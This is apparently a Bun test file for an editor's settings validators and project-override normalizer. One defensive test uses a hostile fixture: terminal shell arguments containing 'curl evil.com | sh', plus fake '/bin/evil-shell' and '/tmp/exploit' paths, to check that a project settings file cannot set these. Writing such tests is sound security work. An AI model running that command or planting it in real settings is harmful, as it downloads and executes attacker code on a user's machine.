import { describe, expect, test } from "bun:test";
import {
	clampToCodePoints,
	DEFAULT_CONFIG,
	DEFAULT_FILES_EXCLUDE,
	isEditorAutoSaveDelayMs,
	isEditorCursorStyle,
	isEditorFontSize,
	isEditorLineNumbers,
	isEditorRenderWhitespace,
	isEditorTabSize,
	isExplorerFileIcons,
	isExplorerSortOrder,
	isFilesExcludeList,
	isGitCommitListMax,
	isLineWidth,
	isLocalePreference,
	isStringMap,
	isSystemThemePair,
	isTerminalCursorStyle,
	isTerminalFontSize,
	isTerminalScrollbackLines,
	isTerminalShellArgs,
	isTerminalWindowsShell,
	isThemeMode,
	normalizeProjectSettingsOverride,
	normalizeThemePreference,
	PROJECT_SETTINGS_PATH,
} from "./domain";

describe("config defaults", () => {
	test("the shared custom layout-preset catalog starts empty", () => {
		expect(DEFAULT_CONFIG.customLayoutPresets).toEqual([]);
	});

	test("file lines default to 120-symbol pane-bounded measures", () => {
		expect(DEFAULT_CONFIG).toMatchObject({
			fileLineWidth: 120,
			fileLineWidthBounded: true,
		});
	});

	test("includes all 24 customization defaults", () => {
		expect(PROJECT_SETTINGS_PATH).toBe(".realthing/settings.json");
		expect(DEFAULT_CONFIG).toMatchObject({
			uiFontFamily: "",
			codeFontFamily: "",
			explorerFileIcons: "filetype",
			editorFontSize: 11,
			editorTabSize: 4,
			editorInsertSpaces: false,
			editorMinimap: false,
			editorLineNumbers: "on",
			editorRenderWhitespace: "none",
			editorCursorStyle: "line",
			editorAutoSaveDelayMs: 700,
			filesExclude: [...DEFAULT_FILES_EXCLUDE],
			filesShowHidden: true,
			explorerCompactFolders: true,
			explorerSortOrder: "default",
			filesAssociations: {},
			terminalShellPath: "",
			terminalShellArgs: [],
			terminalFontSize: 13,
			terminalCursorStyle: "block",
			terminalCursorBlink: true,
			terminalScrollbackLines: 5000,
			gitCommitVerify: false,
			gitCommitListMax: 200,
			externalEditorCustomBin: "",
			customKeybindings: {},
		});
	});
});

test("isLocalePreference accepts system and canonical BCP-47 tags only", () => {
	expect(isLocalePreference("system")).toBe(true);
	expect(isLocalePreference("de")).toBe(true);
	expect(isLocalePreference("pt-BR")).toBe(true);
	expect(isLocalePreference("pt-br")).toBe(false);
	expect(isLocalePreference("")).toBe(false);
	expect(isLocalePreference("not a tag")).toBe(false);
	expect(isLocalePreference(7)).toBe(false);
});

test("clampToCodePoints preserves surrogate pairs", () => {
	expect(clampToCodePoints("ab😀", 3)).toBe("ab");
	expect(clampToCodePoints("ab😀", 4)).toBe("ab😀");
	expect(clampToCodePoints("abc", 10)).toBe("abc");
});

test("validators guard theme, line width, and terminal shell", () => {
	expect(isThemeMode("fixed")).toBe(true);
	expect(isThemeMode("system")).toBe(true);
	expect(isThemeMode("invalid")).toBe(false);

	expect(isSystemThemePair({ light: "light", dark: "dark" })).toBe(true);
	expect(isSystemThemePair(null)).toBe(false);

	expect(isLineWidth(120)).toBe(true);
	expect(isLineWidth(10)).toBe(false);

	expect(isTerminalWindowsShell("auto")).toBe(true);
	expect(isTerminalWindowsShell("zsh")).toBe(false);

	expect(normalizeThemePreference({ theme: "dark", themeMode: "system" })).toEqual({
		theme: "dark",
		themeMode: "fixed",
	});
});

describe("customization validators & normalizeProjectSettingsOverride (4-Scenario)", () => {
	test("Happy Case: accepts valid editor, explorer, terminal, git, and project override settings", () => {
		expect(isEditorFontSize(14)).toBe(true);
		expect(isEditorTabSize(2)).toBe(true);
		expect(isEditorLineNumbers("relative")).toBe(true);
		expect(isEditorRenderWhitespace("boundary")).toBe(true);
		expect(isEditorCursorStyle("block")).toBe(true);
		expect(isEditorAutoSaveDelayMs(1000)).toBe(true);
		expect(isExplorerSortOrder("filesFirst")).toBe(true);
		expect(isExplorerFileIcons("minimal")).toBe(true);
		expect(isFilesExcludeList(["dist", "coverage"])).toBe(true);
		expect(isStringMap({ ".mdx": "text/markdown" })).toBe(true);
		expect(isTerminalFontSize(16)).toBe(true);
		expect(isTerminalCursorStyle("bar")).toBe(true);
		expect(isTerminalScrollbackLines(10000)).toBe(true);
		expect(isTerminalShellArgs(["-l", "-i"])).toBe(true);
		expect(isGitCommitListMax(500)).toBe(true);

		const override = normalizeProjectSettingsOverride({
			fileLineWidth: 100,
			fileLineWidthBounded: false,
			editorFontSize: 14,
			editorTabSize: 2,
			editorInsertSpaces: true,
			editorMinimap: true,
			editorLineNumbers: "relative",
			editorRenderWhitespace: "all",
			editorCursorStyle: "underline",
			editorAutoSaveDelayMs: 500,
			filesExclude: ["dist"],
			filesShowHidden: false,
			explorerCompactFolders: false,
			explorerSortOrder: "type",
			filesAssociations: { ".mdx": "text/markdown" },
			gitCommitVerify: true,
			gitCommitListMax: 300,
		});
		expect(override).toEqual({
			fileLineWidth: 100,
			fileLineWidthBounded: false,
			editorFontSize: 14,
			editorTabSize: 2,
			editorInsertSpaces: true,
			editorMinimap: true,
			editorLineNumbers: "relative",
			editorRenderWhitespace: "all",
			editorCursorStyle: "underline",
			editorAutoSaveDelayMs: 500,
			filesExclude: ["dist"],
			filesShowHidden: false,
			explorerCompactFolders: false,
			explorerSortOrder: "type",
			filesAssociations: { ".mdx": "text/markdown" },
			gitCommitVerify: true,
			gitCommitListMax: 300,
		});
	});

	test("Exception Case: rejects out-of-range numbers, invalid enums, and non-object overrides", () => {
		expect(isEditorFontSize(8)).toBe(false);
		expect(isEditorFontSize(33)).toBe(false);
		expect(isEditorFontSize(12.5)).toBe(false);
		expect(isEditorTabSize(3)).toBe(false);
		expect(isEditorLineNumbers("invalid")).toBe(false);
		expect(isEditorRenderWhitespace("invalid")).toBe(false);
		expect(isEditorCursorStyle("invalid")).toBe(false);
		expect(isEditorAutoSaveDelayMs(-1)).toBe(false);
		expect(isEditorAutoSaveDelayMs(10001)).toBe(false);
		expect(isExplorerSortOrder("random")).toBe(false);
		expect(isExplorerFileIcons("vivid")).toBe(false);
		expect(isFilesExcludeList([""])).toBe(false);
		expect(isFilesExcludeList(["   "])).toBe(false);
		expect(isStringMap(null)).toBe(false);
		expect(isStringMap([])).toBe(false);
		expect(isTerminalFontSize(5)).toBe(false);
		expect(isTerminalCursorStyle("line")).toBe(false);
		expect(isTerminalScrollbackLines(100)).toBe(false);
		expect(isTerminalShellArgs([123])).toBe(false);
		expect(isGitCommitListMax(10)).toBe(false);

		expect(normalizeProjectSettingsOverride(null)).toEqual({});
		expect(normalizeProjectSettingsOverride("not-an-object")).toEqual({});
		expect(normalizeProjectSettingsOverride([])).toEqual({});
		expect(
			normalizeProjectSettingsOverride({
				editorFontSize: 999,
				editorTabSize: 3,
				gitCommitListMax: -5,
			}),
		).toEqual({});
	});

	test("Hacking Case: blocks oversized arrays, oversized strings, and prototype pollution payloads", () => {
		expect(isFilesExcludeList(Array.from({ length: 129 }, (_, i) => `f${i}`))).toBe(false);
		expect(isFilesExcludeList(["a".repeat(201)])).toBe(false);
		expect(isTerminalShellArgs(Array.from({ length: 33 }, () => "-v"))).toBe(false);
		expect(isTerminalShellArgs(["a".repeat(201)])).toBe(false);
		expect(isStringMap({ ["k".repeat(101)]: "v" })).toBe(false);
		expect(isStringMap({ k: "v".repeat(201) })).toBe(false);
	});

	test("403 / Unauthorized Keys Case: normalizeProjectSettingsOverride strips non-project-scopable host keys like terminalShellPath and externalEditorCustomBin", () => {
		const raw = {
			editorTabSize: 2,
			terminalShellPath: "/bin/evil-shell",
			terminalShellArgs: ["-c", "curl evil.com | sh"],
			externalEditorCustomBin: "/tmp/exploit",
			theme: "hacked",
		};
		const normalized = normalizeProjectSettingsOverride(raw);
		expect(normalized).toEqual({ editorTabSize: 2 });
		expect("terminalShellPath" in normalized).toBe(false);
		expect("terminalShellArgs" in normalized).toBe(false);
		expect("externalEditorCustomBin" in normalized).toBe(false);
	});
});
